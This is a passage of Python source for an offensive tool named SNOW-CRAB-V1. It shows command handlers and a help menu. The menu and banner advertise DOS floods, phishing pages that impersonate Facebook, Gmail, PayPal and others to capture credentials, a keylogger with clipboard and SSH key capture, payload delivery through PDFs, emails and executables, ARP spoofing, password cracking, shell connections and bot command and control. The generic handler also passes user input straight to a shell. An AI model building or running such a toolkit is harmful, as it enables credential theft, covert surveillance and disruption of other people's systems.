        output += nmap_result.output[:1000] + "\n\n"
        
        db_info = self.db.conn.execute(
            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
        ).fetchone()
        
        output += "🛡️ Security Status:\n"
        if db_info and db_info['is_blocked']:
            output += "  Status: 🔒 Blocked\n"
            output += f"  Reason: {db_info['block_reason']}\n"
        else:
            output += "  Status: 🟢 Not Blocked\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== SYSTEM COMMAND IMPLEMENTATIONS ====================
    def _status(self, args: List[str]) -> Dict:
        """Get system status"""
        stats = self.db.get_statistics()
        output = f"""
❄️ SNOW-CRAB-V1 System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Registered Agents: {stats.get('total_agents', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  NAT Entries: {stats.get('total_nat_entries', 0)}
  Emails: {stats.get('total_emails', 0)}
  PDF Reports: {stats.get('total_pdf_reports', 0)}
  Alerts: {stats.get('total_alerts', 0)}
  Unacknowledged Alerts: {stats.get('unacknowledged_alerts', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {NetworkTools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        """Get command history"""
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        """Get system information"""
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
Network Sent: {psutil.net_io_counters().bytes_sent / (1024**2):.2f} MB
Network Received: {psutil.net_io_counters().bytes_recv / (1024**2):.2f} MB
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        """Get recent threats"""
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        """Generate security report"""
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
❄️ SNOW-CRAB-V1 Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  NAT Entries: {stats.get('total_nat_entries', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        """Execute generic command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    # ==================== PLATFORM COMMAND IMPLEMENTATIONS ====================
    def _platform_send(self, args: List[str]) -> Dict:
        """Send command to platform"""
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: platform_send <platform> <command>'}
        platform = args[0]
        command = ' '.join(args[1:])
        result = self.platform_executor.execute_on_platform(platform, command)
        return result
    
    def _platform_status(self, args: List[str]) -> Dict:
        """Get platform status"""
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        platforms = self.platform_executor.platforms
        if not platforms:
            return {'success': True, 'output': 'No platforms registered'}
        output = "📱 Platform Status:\n"
        for name, bot in platforms.items():
            status = "🟢 Running" if bot.running else "🔴 Stopped"
            output += f"  • {name}: {status}\n"
        return {'success': True, 'output': output}
    
    def _platform_results(self, args: List[str]) -> Dict:
        """Get platform results"""
        if not self.platform_executor:
            return {'success': False, 'output': 'Platform executor not initialized'}
        limit = int(args[0]) if args else 50
        results = self.platform_executor.get_results(limit)
        if not results:
            return {'success': True, 'output': 'No platform results found'}
        output = "📋 Platform Command Results:\n"
        for r in results:
            output += f"  • {r['id']}: {r['result'].get('success', False)}\n"
        return {'success': True, 'output': output}
    
    # ==================== ANIMATION COMMAND IMPLEMENTATIONS ====================
    def _anim_spinner(self, args: List[str]) -> Dict:
        """Show spinner animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        message = ' '.join(args[1:]) if len(args) > 1 else "Processing"
        TerminalAnimation.spinner(duration, message)
        return {'success': True, 'output': f"🎬 Spinner animation displayed for {duration}s"}
    
    def _anim_matrix(self, args: List[str]) -> Dict:
        """Show matrix rain animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.matrix_rain(duration)
        return {'success': True, 'output': f"🌧️ Matrix rain animation displayed for {duration}s"}
    
    def _anim_pulse(self, args: List[str]) -> Dict:
        """Show pulse animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "❄️ SNOW-CRAB-V1"
        TerminalAnimation.pulse_animation(text, duration)
        return {'success': True, 'output': f"💓 Pulse animation displayed for {duration}s"}
    
    def _anim_wave(self, args: List[str]) -> Dict:
        """Show wave animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        text = ' '.join(args[1:]) if len(args) > 1 else "🌊 SNOW-CRAB-V1"
        TerminalAnimation.wave_animation(text, duration)
        return {'success': True, 'output': f"🌊 Wave animation displayed for {duration}s"}
    
    def _anim_glitch(self, args: List[str]) -> Dict:
        """Show glitch animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 1.0
        text = ' '.join(args[1:]) if len(args) > 1 else "❄️ GLITCH"
        TerminalAnimation.glitch_effect(text, duration)
        return {'success': True, 'output': f"⚡ Glitch animation displayed for {duration}s"}
    
    def _anim_snow(self, args: List[str]) -> Dict:
        """Show snowflake animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.snowflake_fall(duration)
        return {'success': True, 'output': f"❄️ Snowflake animation displayed for {duration}s"}
    
    def _anim_crab(self, args: List[str]) -> Dict:
        """Show crab walk animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.crab_walk(duration)
        return {'success': True, 'output': f"🦀 Crab walk animation displayed for {duration}s"}
    
    def _anim_scan(self, args: List[str]) -> Dict:
        """Show cyber scan animation"""
        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
        TerminalAnimation.cyber_scan_animation(duration)
        return {'success': True, 'output': f"📡 Cyber scan animation displayed for {duration}s"}
    
    # ==================== DNS COMMAND IMPLEMENTATIONS ====================
    def _dns(self, args: List[str]) -> Dict:
        """DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = NetworkTools.dns_lookup(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        """Dig DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self._generic(f'dig {domain} {record_type}')
        return result
    
    def _nslookup(self, args: List[str]) -> Dict:
        """NSLookup"""
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        domain = args[0]
        result = self._generic(f'nslookup {domain}')
        return result
    
    def _host(self, args: List[str]) -> Dict:
        """Host lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: host <domain>'}
        domain = args[0]
        result = self._generic(f'host {domain}')
        return result
    
    def _dns_reverse(self, args: List[str]) -> Dict:
        """Reverse DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_reverse <ip>'}
        ip = args[0]
        result = self._generic(f'dig -x {ip}')
        return result
    
    def _dns_zone(self, args: List[str]) -> Dict:
        """DNS zone transfer"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_zone <domain> <nameserver>'}
        domain = args[0]
        nameserver = args[1] if len(args) > 1 else ''
        result = self._generic(f'dig axfr @{nameserver} {domain}')
        return result
    
    def _dns_mx(self, args: List[str]) -> Dict:
        """DNS MX lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_mx <domain>'}
        domain = args[0]
        result = NetworkTools.dns_lookup(domain, 'MX')
        return {'success': result.success, 'output': result.output}
    
    def _dns_txt(self, args: List[str]) -> Dict:
        """DNS TXT lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_txt <domain>'}
        domain = args[0]
        result = NetworkTools.dns_lookup(domain, 'TXT')
        return {'success': result.success, 'output': result.output}
    
    def _dns_ns(self, args: List[str]) -> Dict:
        """DNS NS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_ns <domain>'}
        domain = args[0]
        result = NetworkTools.dns_lookup(domain, 'NS')
        return {'success': result.success, 'output': result.output}
    
    def _dns_soa(self, args: List[str]) -> Dict:
        """DNS SOA lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_soa <domain>'}
        domain = args[0]
        result = NetworkTools.dns_lookup(domain, 'SOA')
        return {'success': result.success, 'output': result.output}
    
    def _dns_axfr(self, args: List[str]) -> Dict:
        """DNS AXFR zone transfer"""
        if not args:
            return {'success': False, 'output': 'Usage: dns_axfr <domain> <nameserver>'}
        domain = args[0]
        nameserver = args[1] if len(args) > 1 else ''
        result = self._generic(f'dig axfr @{nameserver} {domain}')
        return result
    
    # ==================== WHOIS COMMAND IMPLEMENTATIONS ====================
    def _whois(self, args: List[str]) -> Dict:
        """WHOIS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = NetworkTools.whois_lookup(domain)
        return {'success': result.success, 'output': result.output}
    
    def _whois_ip(self, args: List[str]) -> Dict:
        """WHOIS IP lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois_ip <ip>'}
        ip = args[0]
        result = self._generic(f'whois {ip}')
        return result
    
    # ==================== LOCATION COMMAND IMPLEMENTATIONS ====================
    def _location(self, args: List[str]) -> Dict:
        """Get IP geolocation"""
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = NetworkTools.get_geolocation(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  Region: {result.get('region', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}\n"
            output += f"  Org: {result.get('org', 'Unknown')}\n"
            output += f"  Lat/Lon: {result.get('lat')}, {result.get('lon')}\n"
            output += f"  Timezone: {result.get('timezone', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    # ==================== HELP COMMAND IMPLEMENTATION ====================
    def _help(self, args: List[str]) -> Dict:
        """Display help menu"""
        help_text = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        ❄️ SNOW-CRAB-V1 v{VERSION} - HELP MENU                           {Colors.BLUE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.LIGHTBLUE}                                                                           {Colors.BLUE}║
║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  ping_flood <target>           - Ping flood
║  ping_continuous <target>      - Continuous ping
║  ping_timestamp <target>       - Ping with timestamps
║  ping_size <target> <size>     - Ping with specific packet size
║  ping_ttl <target> <ttl>       - Ping with specific TTL
║  ping_interval <target> <sec>  - Ping with specific interval
║  ping_count <target> <count>   - Ping with specific count
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║  nmap_tcp <target>             - TCP connect scan
║  nmap_syn <target>             - SYN scan
║  nmap_ack <target>             - ACK scan
║  nmap_fin <target>             - FIN scan
║  nmap_xmas <target>            - XMAS scan
║  nmap_null <target>            - NULL scan
║  nmap_aggressive <target>      - Aggressive scan
║  nmap_script <target> <script> - Script scan
║  nmap_ports <target> <ports>   - Scan specific ports
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace network path
║  tracert <target>              - Windows tracert
║  tracepath <target>            - Tracepath
║  mtr <target>                  - MTR
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_port <target> <port> - Traceroute to specific port
║  traceroute_max_hops <target> <hops> - Traceroute with max hops
║  traceroute_numeric <target>   - Numeric traceroute (no DNS)
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS:{Colors.RESET}
║  wget <url> [output]           - Download file
║  wget_file <url> <filename>    - Download to specific file
║  wget_recursive <url>          - Recursive download
║  wget_mirror <url>             - Mirror website
║  wget_continue <url>           - Continue download
║  wget_limit_rate <url> <rate>  - Limit download rate
║  wget_headers <url> <header>   - Download with custom headers
║  wget_user_agent <url> <ua>    - Download with custom user agent
║  wget_auth <url> <user> <pass> - Download with authentication
║
║{Colors.SUCCESS}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_head <url>               - HEAD request
║  curl_headers <url> <header>   - Request with headers
║  curl_auth <url> <user> <pass> - Request with authentication
║  curl_json <url> <json>        - JSON request
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port>          - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║  nc_shell <host> <port>        - Shell connection
║  nc_transfer <host> <port> <file> - File transfer
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║  ssh_keygen <type> [file]      - Generate SSH key
║  ssh_tunnel <local> <remote>   - Create SSH tunnel
║  ssh_socks <port> <host>       - Create SOCKS proxy
║
║{Colors.SUCCESS}🔍 SHODAN COMMANDS:{Colors.RESET}
║  shodan_search <query>         - Search Shodan
║  shodan_host <ip>              - Get host info from Shodan
║  shodan_dns <domain>           - DNS lookup via Shodan
║  shodan_myip                   - Get your public IP via Shodan
║  shodan_scan <ip>              - Request Shodan scan
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║  traffic_icmp <ip> <duration>  - ICMP traffic
║  traffic_tcp <ip> <duration>   - TCP traffic
║  traffic_udp <ip> <duration>   - UDP traffic
║  traffic_http <ip> <duration>  - HTTP traffic
║  traffic_dns <ip> <duration>   - DNS traffic
║  traffic_arp <ip> <duration>   - ARP traffic
║  traffic_mixed <ip> <duration> - Mixed traffic
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood
║  dos_udp <ip> <port> <duration> [threads] - UDP flood
║  dos_http <ip> <port> <duration> [threads] - HTTP flood
║  dos_icmp <ip> <duration> [threads] - ICMP flood
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.SUCCESS}🎣 PHISHING COMMANDS:{Colors.RESET}
║  phish_facebook                - Generate Facebook phishing link
║  phish_instagram               - Generate Instagram phishing link
║  phish_twitter                 - Generate Twitter phishing link
║  phish_gmail                   - Generate Gmail phishing link
║  phish_linkedin                - Generate LinkedIn phishing link
║  phish_microsoft               - Generate Microsoft phishing link
║  phish_google                  - Generate Google phishing link
║  phish_apple                   - Generate Apple phishing link
║  phish_paypal                  - Generate PayPal phishing link
║  phish_amazon                  - Generate Amazon phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║  list_templates                - List all phishing templates
║  view_template <name>          - View a phishing template
║  edit_template <name> <file>   - Edit a phishing template
║  create_template <name> <file> - Create a custom phishing template
║  delete_template <name>        - Delete a phishing template
║
║{Colors.SUCCESS}⌨️ KEYLOGGER COMMANDS:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.SUCCESS}📦 DEPLOYMENT COMMANDS:{Colors.RESET}
║  deploy_pdf <name> <target> <url> - Create PDF payload
║  deploy_email <name> <target> <subject> <body> <url> - Create email
║  deploy_link <name> <target> <url> - Create link payload
║  deploy_executable <name> <target> <server> - Create executable
║  deploy_list                  - List deployments
║  deploy_track <id>            - Track deployment open
║
║{Colors.SUCCESS}🕸️ ARP SPOOFING:{Colors.RESET}
║  arp_spoof <target> <gateway> [interface] - Start ARP spoofing
║  arp_stop [id]                - Stop ARP spoofing
║  arp_status                    - Show active spoofs
║  arp_history [limit]           - Show spoof history
║
║{Colors.SUCCESS}📡 MAC COMMANDS:{Colors.RESET}
║  mac_info <mac>                - Get MAC address info
║  mac_scan [network]            - Scan network for MACs
║  mac_vendor <mac>              - Get MAC vendor
║  mac_all                       - List all MAC addresses
║
║{Colors.SUCCESS}🌐 NAT COMMANDS:{Colors.RESET}
║  nat_info                      - Show NAT information
║  nat_public                    - Show public IP
║  nat_private                   - Show private IP
║  nat_history [limit]           - Show NAT history
║
║{Colors.SUCCESS}🏠 DOMAIN HOSTING:{Colors.RESET}
║  ip_to_domain <ip>            - Translate IP to domain
║  domain_to_ip <domain>        - Translate domain to IP
║  host_domain <ip> <domain> [port] - Host a domain
║  list_domains                 - List hosted domains
║
║{Colors.SUCCESS}🔓 CRACKING COMMANDS:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Start cracking
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║
║{Colors.SUCCESS}🐳 DOCKER COMMANDS:{Colors.RESET}
║  docker_scan <image>           - Scan Docker image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║  docker_bench                  - Docker Bench Security
║
║{Colors.SUCCESS}📧 EMAIL COMMANDS:{Colors.RESET}
║  email_compose <to> <subject> <body> - Compose email
║  email_send <email_id>         - Send email
║  email_list [status]           - List emails
║  email_delete <email_id>       - Delete email
║
║{Colors.SUCCESS}📊 PDF REPORT COMMANDS:{Colors.RESET}
║  report_generate <title> <target> - Generate PDF report
║  report_list                   - List PDF reports
║
║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
║  netmon_start                  - Start network monitoring
║  netmon_stop                   - Stop network monitoring
║  netmon_status                 - Show monitoring status
║  netmon_packets [limit]        - Show captured packets
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}🌐 DNS COMMANDS:{Colors.RESET}
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  dns_mx <domain>               - MX records
║  dns_txt <domain>              - TXT records
║  dns_ns <domain>               - NS records
║
║{Colors.SUCCESS}📋 WHOIS COMMANDS:{Colors.RESET}
║  whois <domain>                - WHOIS lookup
║  whois_ip <ip>                 - WHOIS IP lookup
║
║{Colors.SUCCESS}📍 LOCATION COMMANDS:{Colors.RESET}
║  location <ip>                 - IP geolocation
║  geolocate <ip>                - IP geolocation
║
║{Colors.SUCCESS}📱 PLATFORM COMMANDS:{Colors.RESET}
║  platform_send <platform> <cmd> - Send command to platform
║  platform_status               - Show platform status
║  platform_results [limit]      - Show platform results
║
║{Colors.SUCCESS}🎬 ANIMATION COMMANDS:{Colors.RESET}
║  anim_spinner [duration] [msg] - Show spinner animation
║  anim_matrix [duration]        - Show matrix rain animation
║  anim_pulse [duration] [text]  - Show pulse animation
║  anim_wave [duration] [text]   - Show wave animation
║  anim_glitch [duration] [text] - Show glitch animation
║  anim_snow [duration]          - Show snowflake animation
║  anim_crab [duration]          - Show crab walk animation
║  anim_scan [duration]          - Show cyber scan animation
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 127.0.0.1
║  nmap_quick 192.168.1.1
║  nmap_full 192.168.1.1
║  traceroute 127.0.0.1
║  wget https://example.com/file.txt
║  curl https://example.com
║  traffic icmp 192.168.1.1 10
║  dos_syn 192.168.1.100 80 30 100
║  phish_facebook
║  keylogger_start
║  arp_spoof 192.168.1.100 192.168.1.1
║  mac_info 00:11:22:33:44:55
║  nat_info
║  analyze_ip 127.0.0.1
║  crack md5 5f4dcc3b5aa765d61d8327deb882cf99
║  docker_scan alpine:latest
║  email_compose "user@example.com" "Hello" "Test email"
║  report_generate "Security Report" "192.168.1.1"
║  platform_send discord "ping 127.0.0.1"
║  anim_matrix 3
║
║{Colors.WARNING}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class SnowCrabV1:
    """Main SNOW-CRAB-V1 application"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        
        # Initialize all engines
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.dos = DOSEngine(self.db, self.config) if 'DOSEngine' in dir() else None
        self.network_monitor = NetworkMonitor(self.db, self.config) if 'NetworkMonitor' in dir() else None
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config) if 'DeploymentEngine' in dir() else None
        self.domain_hosting = DomainHostingEngine(self.db, self.config) if 'DomainHostingEngine' in dir() else None
        self.cracking = CrackingEngine(self.db, self.config) if 'CrackingEngine' in dir() else None
        self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
        self.mac_manager = MACManager(self.db) if 'MACManager' in dir() else None
        self.nat_info = NATInfoEngine(self.db) if 'NATInfoEngine' in dir() else None
        self.docker_scanner = DockerScanner(self.db) if 'DockerScanner' in dir() else None
        self.social = SocialEngineeringTools(self.db)
        self.email_composer = EmailComposerEngine(self.db, self.config) if 'EmailComposerEngine' in dir() else None
        self.pdf_report = PDFReportGenerator(self.db, self.config) if 'PDFReportGenerator' in dir() else None
        self.shodan = ShodanEngine(self.config)
        
        # Initialize platform executor
        self.platform_executor = PlatformCommandExecutor(None, self.config) if 'PlatformCommandExecutor' in dir() else None
        if self.platform_executor:
            self.platform_executor.db = self.db
        
        # Initialize command handler
        self.handler = CommandHandler(
            self.db,
            self.ssh,
            self.traffic,
            self.dos,
            self.network_monitor,
            self.keylogger,
            self.deployment,
            self.domain_hosting,
            self.cracking,
            self.arp_spoofing,
            self.mac_manager,
            self.nat_info,
            self.platform_executor,
            self.email_composer,
            self.pdf_report,
            self.docker_scanner,
            self.shodan,
            self.social
        )
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        """Print the application banner"""
        banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        ❄️ SNOW-CRAB-V1 v{VERSION} - Cyber Command Platform              {Colors.BLUE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.LIGHTBLUE}                                                                           {Colors.BLUE}║
║{Colors.SUCCESS}  • ❄️ 300+ Security Commands         • 📡 Ping / Nmap / Curl / Netcat{Colors.BLUE}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation    {Colors.BLUE}║
║{Colors.SUCCESS}  • 🕷️ Web Vulnerability Scanner        • 🎣 Social Engineering Suite   {Colors.BLUE}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    {Colors.BLUE}║
║{Colors.SUCCESS}  • 📧 Spear Phishing Campaigns        • 🤖 Agent Command & Control    {Colors.BLUE}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration  • 💻 Blue & White Web Dashboard {Colors.BLUE}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack         • Signal | WhatsApp | GoogleChat{Colors.BLUE}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection • 🌐 IP to Domain Translation   {Colors.BLUE}║
║{Colors.SUCCESS}  • 🏠 Domain Hosting Engine           • 📊 Graphical Reports         {Colors.BLUE}║
║{Colors.SUCCESS}  • 📡 Network Monitoring               • 🔐 Agent Mode                 {Colors.BLUE}║
║{Colors.SUCCESS}  • 📦 PDF/Email/Link Deployment       • 🔑 Clipboard/SSH Key Capture  {Colors.BLUE}║
║{Colors.SUCCESS}  • 🔓 Password Cracking Engine        • 🐳 Docker Security Scanning   {Colors.BLUE}║
║{Colors.SUCCESS}  • 📡 MAC Address Management          • 🌐 NAT Information            {Colors.BLUE}║
║{Colors.SUCCESS}  • 🕸️ ARP Spoofing                    • 📧 Email Composition        {Colors.BLUE}║
║{Colors.SUCCESS}  • 📊 PDF Report Generation           • 🔍 Shodan Integration          {Colors.BLUE}║
